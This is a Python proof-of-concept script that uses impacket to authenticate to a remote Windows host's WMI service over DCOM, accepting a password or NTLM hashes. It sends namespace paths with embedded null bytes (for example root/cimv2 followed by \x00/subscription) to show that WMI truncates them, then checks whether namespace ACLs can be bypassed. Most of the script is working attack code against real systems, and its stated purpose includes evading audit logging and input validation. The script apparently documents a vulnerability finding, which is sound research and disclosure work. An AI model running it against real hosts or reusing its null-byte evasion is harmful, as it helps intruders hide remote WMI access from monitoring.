#!/usr/bin/env python3
"""
WMI Namespace Null-Byte Truncation PoC (CWE-158)

Demonstrates that Windows WMI (CIMOM) treats namespace paths as null-terminated
C strings, allowing an embedded null byte to truncate the path. The server-side
WMI provider ignores everything after the first null byte.

Example: "//./root/cimv2\x00/subscription" -> connects to root/cimv2

Impact:
  - Security monitoring/logging bypass: tools that log the full namespace string
    see a different path than what WMI actually uses
  - Input validation bypass: applications that validate namespace paths via
    string comparison could be tricked (null byte makes path appear different)
  - Does NOT bypass WMI namespace ACLs (access check operates on the real
    truncated namespace)

Tested: Windows Server 2019 Datacenter (10.0.17763)
Protocol: DCOM/WMI (remote, IWbemLevel1Login::NTLMLogin)

Usage:
    python3 wmi_nullbyte_poc.py domain/user:pass@target
"""

import argparse
import sys

from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import (
    CLSID_WbemLevel1Login,
    IID_IWbemLevel1Login,
    IWbemLevel1Login,
)
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.utils import parse_target


def test_namespace(address, username, password, domain, namespace, label):
    """Connect to a namespace and return (success, sub_namespaces, error)."""
    try:
        dcom = DCOMConnection(address, username, password, domain, oxidResolver=True)
        iI = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
        iL = IWbemLevel1Login(iI)
        iW = iL.NTLMLogin(namespace, NULL, NULL)

        namespaces = []
        result = iW.ExecQuery('SELECT Name FROM __NAMESPACE')
        while True:
            try:
                obj = result.Next(0xffffffff, 1)[0]
                namespaces.append(obj.getProperties()['Name']['value'])
            except Exception:
                break

        os_name = None
        try:
            result2 = iW.ExecQuery('SELECT Caption FROM Win32_OperatingSystem')
            obj2 = result2.Next(0xffffffff, 1)[0]
            os_name = obj2.getProperties()['Caption']['value']
        except Exception:
            pass

        iW.RemRelease()
        dcom.disconnect()
        return True, namespaces, os_name
    except Exception as e:
        try:
            dcom.disconnect()
        except Exception:
            pass
        return False, [], str(e)


def main():
    parser = argparse.ArgumentParser(
        description='WMI Namespace Null-Byte Truncation PoC (CWE-158)')
    parser.add_argument('target', help='[[domain/]username[:password]@]<target>')
    parser.add_argument('-hashes', metavar='LMHASH:NTHASH')
    args = parser.parse_args()

    domain, username, password, address = parse_target(args.target)
    if domain is None:
        domain = ''
    if args.hashes:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = nthash = ''
    if password == '' and username != '' and not args.hashes:
        from getpass import getpass
        password = getpass('Password:')

    print(f'[*] Target: {address}')
    print(f'[*] User:   {domain}\\{username}')
    print()

    # Step 1: Connect normally to root/cimv2
    print('[1] Normal connection to root/cimv2')
    ok, ns, info = test_namespace(address, username, password, domain,
                                  '//./root/cimv2', 'normal')
    if not ok:
        print(f'    FAILED: {info}')
        sys.exit(1)
    print(f'    OK — {info}')
    print(f'    Sub-namespaces: {ns[:5]}{"..." if len(ns) > 5 else ""}')
    baseline_ns = set(ns)

    # Step 2: Connect with null-byte appended path
    print()
    print('[2] Null-byte injection: root/cimv2\\x00/subscription')
    print('    The path after the null should be ignored by WMI')
    ok2, ns2, info2 = test_namespace(address, username, password, domain,
                                     '//./root/cimv2\x00/subscription', 'nullbyte')
    if not ok2:
        print(f'    FAILED: {info2}')
        print('    Null-byte was NOT truncated (or auth failed)')
        sys.exit(1)

    ns2_set = set(ns2)
    print(f'    OK — connected successfully!')
    print(f'    Sub-namespaces: {ns2[:5]}{"..." if len(ns2) > 5 else ""}')

    if ns2_set == baseline_ns:
        print(f'    [!] Sub-namespaces MATCH root/cimv2 — null-byte truncation CONFIRMED')
    else:
        print(f'    [?] Sub-namespaces differ — unexpected behavior')

    # Step 3: Verify root/subscription is ACCESS_DENIED normally
    print()
    print('[3] Verify root/subscription is normally denied')
    ok3, _, info3 = test_namespace(address, username, password, domain,
                                   '//./root/subscription', 'denied')
    if not ok3 and 'ACCESS_DENIED' in str(info3):
        print(f'    Correctly denied — root/subscription requires higher privileges')
    elif ok3:
        print(f'    Unexpectedly succeeded — user has subscription access')
    else:
        print(f'    Error: {info3}')

    # Step 4: Verify reverse direction doesn't bypass
    print()
    print('[4] Verify null-byte does NOT bypass namespace ACLs')
    print('    Testing: root/subscription\\x00cimv2 (should be DENIED)')
    ok4, _, info4 = test_namespace(address, username, password, domain,
                                   '//./root/subscription\x00cimv2', 'bypass')
    if not ok4 and 'ACCESS_DENIED' in str(info4):
        print(f'    Correctly denied — ACL check operates on pre-null path')
    elif ok4:
        print(f'    [!!!] SUCCEEDED — namespace ACL BYPASS! This is critical!')
    else:
        print(f'    Error: {info4}')

    # Summary
    print()
    print('=' * 60)
    print('SUMMARY')
    print('=' * 60)
    print()
    print('Finding: WMI Namespace Null-Byte Truncation (CWE-158)')
    print()
    print('The Windows WMI provider (wmiprvse.exe / CIMOM) accepts')
    print('namespace paths with embedded null bytes and truncates')
    print('at the first null. The full string including post-null')
    print('content is transmitted over the wire (confirmed via')
    print("impacket's checkNullString — no client-side stripping).")
    print()
    print('Path sent:     root/cimv2\\x00/subscription')
    print('Path resolved: root/cimv2 (truncated at null)')
    print()
    print('Security Impact:')
    print('  - Namespace ACL check: NOT bypassed (checks truncated path)')
    print('  - Audit/logging: May log full string including post-null')
    print('    content, misrepresenting the actual namespace accessed')
    print('  - Input validation: Applications validating namespace paths')
    print('    via full string comparison could be bypassed')
    print()
    print('Affected: Windows Server 2019 (confirmed), likely all versions')
    print('Protocol: DCOM/WMI IWbemLevel1Login::NTLMLogin')


if __name__ == '__main__':
    main()
